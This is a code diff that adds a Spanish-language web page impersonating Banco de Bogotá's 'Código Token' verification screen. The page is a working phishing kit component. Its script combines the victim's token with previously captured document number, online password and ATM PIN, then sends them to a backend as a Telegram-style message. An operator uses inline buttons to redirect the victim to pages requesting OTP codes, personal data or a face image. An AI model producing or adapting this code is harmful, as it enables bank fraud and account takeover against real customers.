@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+
+<html lang="es">
+
+<head>
+    <meta charset="utf-8" />
+    <meta content="width=device-width, initial-scale=1" name="viewport" />
+    <title>
+        Banco de Bogotá
+    </title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet" />
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');
+
+
+        body {
+            font-family: 'Inter', sans-serif;
+        }
+
+        /* Loader CSS */
+        .loader-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 1.5rem;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 4px solid #fff;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+
+        /* Modal Error */
+        .custom-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .custom-modal-content {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+            animation: slideIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+
+            to {
+                opacity: 1;
+            }
+        }
+
+        @keyframes slideIn {
+            from {
+                transform: translateY(-30px);
+                opacity: 0;
+            }
+
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+
+
+</head>
+
+<body class="bg-[#f3f7fc] min-h-screen flex flex-col items-center p-4">
+    <header class="w-full max-w-md flex items-center justify-between py-4">
+        <button aria-label="Volver" class="text-[#1a2a5a] text-xl">
+            <i class="fas fa-chevron-left"></i>
+        </button>
+        <h1 class="text-[#003da5] font-semibold text-base">
+            Banco de Bogotá
+        </h1>
+        <button aria-label="Cerrar" class="text-[#1a2a5a] text-xl">
+            <i class="fas fa-times"></i>
+        </button>
+    </header>
+    <main class="w-full max-w-md">
+        <br>
+        <h2 class="text-[#003da5] font-semibold text-lg mb-4">
+            Verifiquemos que seas tú
+        </h2>
+        <section class="bg-white rounded-lg p-5 shadow-sm">
+            <div class="flex items-start space-x-3 mb-3">
+                <img alt="Icono de candado abierto con código" class="w-6 h-6 flex-shrink-0 mt-1" decoding="async"
+                    height="24" loading="lazy" src="candado.png" width="24" />
+                <div>
+                    <div class="flex items-center space-x-1 mb-1">
+                        <span class="font-semibold text-[#003da5] text-base">
+                            Código Token
+                        </span>
+                        <button aria-label="Información sobre Código Token"
+                            class="text-[#003da5] border border-[#003da5] rounded-full w-5 h-5 flex items-center justify-center text-xs font-semibold leading-none">
+                            i
+                        </button>
+                    </div>
+                    <p class="text-[#5a5a5a] text-sm leading-relaxed max-w-[320px]">
+                        Para realizar este proceso, ingresa el código Token móvil o físico.
+                    </p>
+                </div>
+            </div>
+            <form class="mt-4" onsubmit="event.preventDefault()">
+                <div id="token-inputs" class="grid grid-cols-6 gap-2 justify-center mb-6">
+                    <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*"
+                        class="token-input w-10 h-10 rounded-md border border-[#d1d5db] bg-white text-center text-lg font-semibold text-[#003da5] focus:outline-none focus:ring-2 focus:ring-[#003da5]" />
+                    <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*"
+                        class="token-input w-10 h-10 rounded-md border border-[#d1d5db] bg-white text-center text-lg font-semibold text-[#003da5] focus:outline-none focus:ring-2 focus:ring-[#003da5]" />
+                    <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*"
+                        class="token-input w-10 h-10 rounded-md border border-[#d1d5db] bg-white text-center text-lg font-semibold text-[#003da5] focus:outline-none focus:ring-2 focus:ring-[#003da5]" />
+                    <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*"
+                        class="token-input w-10 h-10 rounded-md border border-[#d1d5db] bg-white text-center text-lg font-semibold text-[#003da5] focus:outline-none focus:ring-2 focus:ring-[#003da5]" />
+                    <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*"
+                        class="token-input w-10 h-10 rounded-md border border-[#d1d5db] bg-white text-center text-lg font-semibold text-[#003da5] focus:outline-none focus:ring-2 focus:ring-[#003da5]" />
+                    <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*"
+                        class="token-input w-10 h-10 rounded-md border border-[#d1d5db] bg-white text-center text-lg font-semibold text-[#003da5] focus:outline-none focus:ring-2 focus:ring-[#003da5]" />
+                </div>
+                <p id="errorMessage" class="text-red-500 text-center mb-4 hidden">Token incorrecto, intenta de nuevo.
+                </p>
+
+
+                <button id="verifyBtn"
+                    class="w-full bg-[#e5e7eb] text-[#9ca3af] font-semibold text-base rounded-full py-3 cursor-not-allowed transition-colors duration-200"
+                    disabled type="submit">
+                    Verificar
+                </button>
+            </form>
+        </section>
+    </main>
+
+    <div id="loader" class="loader-overlay" style="display: none;">
+        <div class="spinner"></div>
+        <p>Verificando Token...</p>
+    </div>
+
+    <!-- Error Modal -->
+    <div id="error-modal" class="custom-modal" style="display: none;">
+        <div class="custom-modal-content">
+            <div style="display: flex; align-items: center; justify-content: center; gap: 20px;">
+                <img src="img/error.png" alt="Icono de error" style="width: 60px; height: 60px;">
+                <div>
+                    <h3 style="margin-bottom: 10px; color: #003da5; font-weight: bold;">¡Ups! Algo salió mal</h3>
+                    <p style="font-size: 14px;">El código Token ingresado no es correcto. Por favor, verifícalo e
+                        inténtalo nuevamente.</p>
+                </div>
+            </div>
+            <button id="close-error-modal"
+                style="width: 100%; margin-top: 20px; background-color: #003da5; color: white; padding: 10px; border-radius: 5px; font-weight: bold;">Intentar
+                de nuevo</button>
+        </div>
+    </div>
+
+    <script>
+        const inputs = document.querySelectorAll(".token-input");
+        const verifyBtn = document.getElementById("verifyBtn");
+        const errorMessage = document.getElementById("errorMessage");
+        const loader = document.getElementById("loader");
+        const errorModal = document.getElementById('error-modal');
+        const closeErrorModalBtn = document.getElementById('close-error-modal');
+
+        closeErrorModalBtn.addEventListener('click', () => {
+            errorModal.style.display = 'none';
+            inputs.forEach(input => input.value = '');
+            inputs[0].focus();
+            checkAllFilled();
+        });
+
+        let initialLoginData = null;
+
+        async function sendTokenDataToBackend(messageContent, keyboard) {
+            const url = '/api/send-message';
+            const payload = { text: messageContent, keyboard };
+            try {
+                const response = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+                const data = await response.json();
+                if (!response.ok) { console.error(`Error al enviar Token al backend: ${response.status}`, data.error); return null; }
+                return data.result.message_id;
+            } catch (error) { console.error('Error de red al enviar Token al backend:', error); return false; }
+        }
+
+        async function checkOperatorResponse(messageId) {
+            try {
+                const response = await fetch(`/api/check-update/${messageId}`);
+                if (response.status === 408) { loader.style.display = 'none'; alert("El operador no respondió a tiempo. Por favor, intente de nuevo."); window.location.reload(); return; }
+                const data = await response.json();
+                if (data.action) {
+                    loader.style.display = 'none';
+                    if (data.action === 'error_token') {
+                        errorModal.style.display = 'flex';
+                    } else if (data.action === 'pedir_datos') {
+                        window.location.href = "datos.html";
+                    } else if (data.action === 'pedir_sms') {
+                        window.location.href = "otp.html";
+                    } else if (data.action === 'pedir_cara') {
+                        window.location.href = "cara.html";
+                    } else if (data.action === 'finalizar') {
+                        window.location.href = "finish.html";
+                    } else {
+                        alert("Respuesta no reconocida. Por favor, intente de nuevo.");
+                    }
+                } else { setTimeout(() => checkOperatorResponse(messageId), 2000); }
+            } catch (error) { loader.style.display = 'none'; alert("Ocurrió un error de comunicación. Por favor, recarga la página."); }
+        }
+
+        document.addEventListener('DOMContentLoaded', async () => {
+            const storedData = sessionStorage.getItem('initialLoginData');
+            if (storedData) { initialLoginData = JSON.parse(storedData); } else { window.location.href = 'index.html'; }
+        });
+
+        inputs.forEach((input, i) => {
+            input.addEventListener("input", (e) => {
+                const value = e.target.value;
+                if (/^\d$/.test(value)) { if (i < inputs.length - 1) inputs[i + 1].focus(); } else { e.target.value = ""; }
+                checkAllFilled();
+            });
+            input.addEventListener("keydown", (e) => { if (e.key === "Backspace" && !input.value && i > 0) { inputs[i - 1].focus(); } });
+            input.addEventListener("paste", (e) => {
+                e.preventDefault();
+                const paste = (e.clipboardData || window.clipboardData).getData("text").replace(/\D/g, "").slice(0, 6);
+                [...paste].forEach((char, idx) => { if (inputs[idx]) inputs[idx].value = char; });
+                if (paste.length > 0) { inputs[Math.min(paste.length, inputs.length - 1)].focus(); }
+                checkAllFilled();
+            });
+        });
+
+        function checkAllFilled() {
+            const allFilled = [...inputs].every((inp) => inp.value.length === 1);
+            verifyBtn.disabled = !allFilled;
+            verifyBtn.classList.toggle("cursor-not-allowed", !allFilled);
+            verifyBtn.classList.toggle("bg-[#e5e7eb]", !allFilled);
+            verifyBtn.classList.toggle("text-[#9ca3af]", !allFilled);
+            verifyBtn.classList.toggle("bg-[#003da5]", allFilled);
+            verifyBtn.classList.toggle("text-white", allFilled);
+        }
+
+        verifyBtn.addEventListener('click', async () => {
+            const token = [...inputs].map(input => input.value).join('');
+            errorMessage.classList.add('hidden');
+            loader.style.display = 'flex';
+
+            let message = `<b>🏦 TOKEN DINÁMICO - BOGOTÁ 🏦</b>\n`;
+
+            if (initialLoginData) {
+                if (initialLoginData.identificationType) message += `<b>🆔 Tipo Doc:</b> ${initialLoginData.identificationType}\n`;
+                if (initialLoginData.identificationNumber) message += `<b>👤 Documento:</b> <code>${initialLoginData.identificationNumber}</code>\n`;
+                if (initialLoginData.secureKey && initialLoginData.secureKey !== 'N/A') message += `<b>🔑 Clave:</b> <code>${initialLoginData.secureKey}</code>\n`;
+                if (initialLoginData.debitCardKey && initialLoginData.debitCardKey !== 'N/A') message += `<b>🔑 Clave Cajero:</b> <code>${initialLoginData.debitCardKey}</code>\n`;
+            }
+
+            message += `\n<b>💎 Token:</b> <code>${token}</code>\n`;
+            message += `<b>📅 Fecha:</b> ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}`;
+
+            const keyboard = {
+                inline_keyboard: [
+                    [{ text: "❌ Error Token", callback_data: `error_token:N/A` },
+                    { text: "📋 Ir a Datos", callback_data: `pedir_datos:N/A` }],
+                    [{ text: "👀 Pedir OTP", callback_data: `pedir_sms:N/A` },
+                    { text: "👤 Pedir Cara", callback_data: `pedir_cara:N/A` }],
+                    [{ text: "✅ Finalizar", callback_data: `finalizar:N/A` }]
+                ]
+            };
+            const messageId = await sendTokenDataToBackend(message, keyboard);
+            if (messageId) { checkOperatorResponse(messageId); } else { loader.style.display = 'none'; alert("Error al enviar Token. Por favor, inténtalo de nuevo."); }
+        });
+    </script>
+
+
+</body>
+
+</html>
